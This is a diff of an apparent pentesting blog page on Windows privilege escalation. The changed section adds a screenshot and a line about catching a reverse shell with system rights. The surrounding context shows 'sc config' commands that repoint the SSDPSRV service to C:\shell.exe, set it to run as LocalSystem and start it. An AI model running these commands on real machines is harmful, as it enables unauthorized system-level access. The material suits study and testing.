@@ -14,7 +14,8 @@
 <meta property="og:description" content="AccessCheckDownload AccessCheck12345678910(( STAGE++ )); echo -e &amp;quot;\n\n $&amp;#123;GREEN&amp;#125;[+]$&amp;#123;RESET&amp;#125; ($&amp;#123;STAGE&amp;#125;/$&amp;#123;TOTAL&amp;#125;) Downloading $&amp;#123;GREEN&amp;#125;AccessChk.exe$">
 <meta property="og:image" content="http://i.imgur.com/73YfzoO.png">
 <meta property="og:image" content="http://i.imgur.com/76ssTNl.png">
-<meta property="og:updated_time" content="2017-01-23T12:57:51.400Z">
+<meta property="og:image" content="http://i.imgur.com/0MR38TZ.png">
+<meta property="og:updated_time" content="2017-01-23T13:04:23.904Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Windows Privilege Escalation">
 <meta name="twitter:description" content="AccessCheckDownload AccessCheck12345678910(( STAGE++ )); echo -e &amp;quot;\n\n $&amp;#123;GREEN&amp;#125;[+]$&amp;#123;RESET&amp;#125; ($&amp;#123;STAGE&amp;#125;/$&amp;#123;TOTAL&amp;#125;) Downloading $&amp;#123;GREEN&amp;#125;AccessChk.exe$">
@@ -145,6 +146,8 @@
 <h3 id="Example-output-1"><a href="#Example-output-1" class="headerlink" title="Example output"></a>Example output</h3><p><img src="http://i.imgur.com/76ssTNl.png" alt="scqc"></p>
 <p>To escalate privileges we can change binary path name, user and then start this server with system privileges:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sc config SSDPSRV binpath= &quot;C:\shell.exe&quot;</div><div class="line">sc config SSDPSRV obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</div><div class="line">sc config SSDPSRV start= demand</div><div class="line">net start SSDPSRV</div></pre></td></tr></table></figure>
+<p>And hopefully on our server we’ll have a reverse shell with system privileges:</p>
+<p><img src="http://i.imgur.com/0MR38TZ.png" alt="shell"></p>
 
   </div>
 </article>
